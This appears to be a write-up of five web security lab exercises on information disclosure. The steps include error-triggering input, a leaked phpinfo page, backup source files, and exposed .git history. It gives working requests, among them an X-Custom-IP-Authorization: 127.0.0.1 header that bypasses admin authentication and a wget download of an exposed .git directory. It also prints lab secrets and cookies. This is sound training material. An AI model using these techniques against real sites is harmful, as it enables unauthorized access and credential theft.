
# Lab 1

## Description

This lab's verbose error messages reveal that it is using a vulnerable version of a third-party framework. To solve the lab, obtain and submit the version number of this framework.
## Solution

Easy stuff:

Payload is a `'` in `productCategory` HTTP GET parameter:

```
/product?productId=2'
```

which results in a verbose error message:

```
Internal Server Error: java.lang.NumberFormatException: For input string: "2'"
	at java.base/java.lang.NumberFormatException.forInputString(NumberFormatException.java:67)
	at java.base/java.lang.Integer.parseInt(Integer.java:661)
	at java.base/java.lang.Integer.parseInt(Integer.java:777)
	at lab.c.w.x.y.Z(Unknown Source)
	at lab.o.go.g.z.h(Unknown Source)
	at lab.o.go.i.z.p.E(Unknown Source)
	at lab.o.go.i.e.lambda$handleSubRequest$0(Unknown Source)
	at s.x.s.t.lambda$null$3(Unknown Source)
	at s.x.s.t.N(Unknown Source)
	at s.x.s.t.lambda$uncheckedFunction$4(Unknown Source)
	at java.base/java.util.Optional.map(Optional.java:260)
	at lab.o.go.i.e.y(Unknown Source)
	at lab.server.k.a.n.l(Unknown Source)
	at lab.o.go.v.B(Unknown Source)
	at lab.o.go.v.l(Unknown Source)
	at lab.server.k.a.k.p.B(Unknown Source)
	at lab.server.k.a.k.b.lambda$handle$0(Unknown Source)
	at lab.c.t.z.p.Q(Unknown Source)
	at lab.server.k.a.k.b.Q(Unknown Source)
	at lab.server.k.a.r.V(Unknown Source)
	at s.x.s.t.lambda$null$3(Unknown Source)
	at s.x.s.t.N(Unknown Source)
	at s.x.s.t.lambda$uncheckedFunction$4(Unknown Source)
	at lab.server.gv.B(Unknown Source)
	at lab.server.k.a.r.G(Unknown Source)
	at lab.server.k.w.c.q(Unknown Source)
	at lab.server.k.q.m(Unknown Source)
	at lab.server.k.c.m(Unknown Source)
	at lab.server.gd.F(Unknown Source)
	at lab.server.gd.r(Unknown Source)
	at lab.x.e.lambda$consume$0(Unknown Source)
	at java.base/java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1144)
	at java.base/java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:642)
	at java.base/java.lang.Thread.run(Thread.java:1583)

Apache Struts 2 2.3.31
```

which reveals the version `Apache Struts 2 2.3.31`. Submitting this version solves the lab.


# Lab 2

## Description

This lab contains a debug page that discloses sensitive information about the application. To solve the lab, obtain and submit the `SECRET_KEY` environment variable.

## Solution

Reading the HTML source code of the main page shows:

```
[...]
<!-- <a href=/cgi-bin/phpinfo.php>Debug</a> -->
[...]
```

Heading to:

```
/cgi-bin/phpinfo.php
```

shows a default `phpinfo.php` page but with a `SECRET_KEY` field holding:

```
0sjgysotwcmgqykps8fqc70b40paipdq
```

Submitting the key solves the lab.


# Lab 3

## Description

This lab leaks its source code via backup files in a hidden directory. To solve the lab, identify and submit the database password, which is hard-coded in the leaked source code.

## Solution

Heading to `/backup` (light guess work) shows a directory listing with the file:

```
|   |   |
|---|---|
|[ProductTemplate.java.bak](https://0a6700b0033b60e4808c67e7003d00f8.web-security-academy.net/backup/ProductTemplate.java.bak)||
```

Clicking on it reveals the java source code of the file which shows:

```
[...]
private void readObject(ObjectInputStream inputStream) throws IOException, ClassNotFoundException
    {
        inputStream.defaultReadObject();

        ConnectionBuilder connectionBuilder = ConnectionBuilder.from(
                "org.postgresql.Driver",
                "postgresql",
                "localhost",
                5432,
                "postgres",
                "postgres",
                "l5d6e53ki60be07dmmntwrzk4ram4vz0"
        ).withAutoCommit();
[...]
```

submitting the following password solves the lab:

```
l5d6e53ki60be07dmmntwrzk4ram4vz0
```


# Lab 4

## Description

This lab's administration interface has an authentication bypass vulnerability, but it is impractical to exploit without knowledge of a custom HTTP header used by the front-end.

To solve the lab, obtain the header name then use it to bypass the lab's authentication. Access the admin interface and delete the user `carlos`.

You can log in to your own account using the following credentials: `wiener:peter`

## Solution

Heading to `/admin` shows:

```
Admin interface only available to local users
```

Using:

```
TRACE /admin
```

returns:

```
TRACE /admin HTTP/1.1
Host: 0ab100f103d995b08186c14900d10013.web-security-academy.net
sec-ch-ua: "Chromium";v="137", "Not/A)Brand";v="24"
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: "Linux"
accept-language: en-US,en;q=0.9
upgrade-insecure-requests: 1
user-agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36
accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
sec-fetch-site: none
sec-fetch-mode: navigate
sec-fetch-user: ?1
sec-fetch-dest: document
accept-encoding: gzip, deflate, br
priority: u=0, i
cookie: session=5ufIEHvmHphMGJk5euc6GFphsiyB0FG8
Content-Length: 0
X-Custom-IP-Authorization: 154.67.15.43
```

Trying the following:

```
GET /admin HTTP/2
Host: 0ab100f103d995b08186c14900d10013.web-security-academy.net
Cookie: session=5ufIEHvmHphMGJk5euc6GFphsiyB0FG8
Sec-Ch-Ua: "Chromium";v="137", "Not/A)Brand";v="24"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Linux"
Accept-Language: en-US,en;q=0.9
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: none
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Accept-Encoding: gzip, deflate, br
Priority: u=0, i
X-Custom-Ip-Authorization: 127.0.0.1
```

returns `200  OK` and the admin interface. Searching for `delete` shows:

```
<a href="/admin/delete?username=carlos">Delete</a>
```

Using the same header:

```
GET /admin/delete?username=carlos HTTP/2
Host: 0ab100f103d995b08186c14900d10013.web-security-academy.net
[...]
X-Custom-Ip-Authorization: 127.0.0.1
```

solves the lab.


# Lab 5

## Description

This lab discloses sensitive information via its version control history. To solve the lab, obtain the password for the `administrator` user then log in and delete the user `carlos`.

## Solution

As the description suggests, trying `/.git` shows a directory listing:

```
# Index of /.git

|Name|Size|
|---|---|
|[<branches>](https://0a9b00df0492f69180fc267300e500f8.web-security-academy.net/.git/branches/)||
|[description](https://0a9b00df0492f69180fc267300e500f8.web-security-academy.net/.git/description)|73B|
|[<hooks>](https://0a9b00df0492f69180fc267300e500f8.web-security-academy.net/.git/hooks/)||
|[<info>](https://0a9b00df0492f69180fc267300e500f8.web-security-academy.net/.git/info/)||
|[<refs>](https://0a9b00df0492f69180fc267300e500f8.web-security-academy.net/.git/refs/)||
|[HEAD](https://0a9b00df0492f69180fc267300e500f8.web-security-academy.net/.git/HEAD)|23B|
|[config](https://0a9b00df0492f69180fc267300e500f8.web-security-academy.net/.git/config)|157B|
|[<objects>](https://0a9b00df0492f69180fc267300e500f8.web-security-academy.net/.git/objects/)||
|[index](https://0a9b00df0492f69180fc267300e500f8.web-security-academy.net/.git/index)|225B|
|[COMMIT_EDITMSG](https://0a9b00df0492f69180fc267300e500f8.web-security-academy.net/.git/COMMIT_EDITMSG)|34B|
|[<logs>](https://0a9b00df0492f69180fc267300e500f8.web-security-academy.net/.git/logs/)||
```

Looking at logs reveals:

```
0000000000000000000000000000000000000000 fdc61a6b4b1534f914e06cab554241418ca5f3c4 Carlos Montoya <carlos@carlos-montoya.net> 1765511542 +0000	commit (initial): Add skeleton admin panel
fdc61a6b4b1534f914e06cab554241418ca5f3c4 fd6598315b2ddf336ae457ca5de6c7834b6d9931 Carlos Montoya <carlos@carlos-montoya.net> 1765511542 +0000	commit: Remove admin password from config
```

the admin password was removed via a recent commit. 

Downloading the `.git` directory with:

```
wget -r https://0a9b00df0492f69180fc267300e500f8.web-security-academy.net/.git
```

Looking at logs with:

```
git log                                                    
commit fd6598315b2ddf336ae457ca5de6c7834b6d9931 (HEAD -> master)
Author: Carlos Montoya <carlos@carlos-montoya.net>
Date:   Tue Jun 23 14:05:07 2020 +0000

    Remove admin password from config

commit fdc61a6b4b1534f914e06cab554241418ca5f3c4
Author: Carlos Montoya <carlos@carlos-montoya.net>
Date:   Mon Jun 22 16:23:42 2020 +0000

    Add skeleton admin panel
```

Now with more details:

```
git log --patch              
commit fd6598315b2ddf336ae457ca5de6c7834b6d9931 (HEAD -> master)
Author: Carlos Montoya <carlos@carlos-montoya.net>
Date:   Tue Jun 23 14:05:07 2020 +0000

    Remove admin password from config

diff --git a/admin.conf b/admin.conf
index ce4ab39..21d23f1 100644
--- a/admin.conf
+++ b/admin.conf
@@ -1 +1 @@
-ADMIN_PASSWORD=o2560x1aovw7d0w3oqd2
+ADMIN_PASSWORD=env('ADMIN_PASSWORD')

commit fdc61a6b4b1534f914e06cab554241418ca5f3c4
Author: Carlos Montoya <carlos@carlos-montoya.net>
Date:   Mon Jun 22 16:23:42 2020 +0000

    Add skeleton admin panel

diff --git a/admin.conf b/admin.conf
new file mode 100644
index 0000000..ce4ab39
--- /dev/null
+++ b/admin.conf
@@ -0,0 +1 @@
+ADMIN_PASSWORD=o2560x1aovw7d0w3oqd2
diff --git a/admin_panel.php b/admin_panel.php
new file mode 100644
index 0000000..8944e3b
--- /dev/null
+++ b/admin_panel.php
@@ -0,0 +1 @@
+<?php echo 'TODO: build an amazing admin panel, but remember to check the password!'; ?>
\ No newline at end of file
```

This shows:

```
[...]
+ADMIN_PASSWORD=o2560x1aovw7d0w3oqd2
[...]
```

Using this password, logging in as the `administrator` user with the password above let's us access the admin panel and remove the user `carlos` which solves the lab.


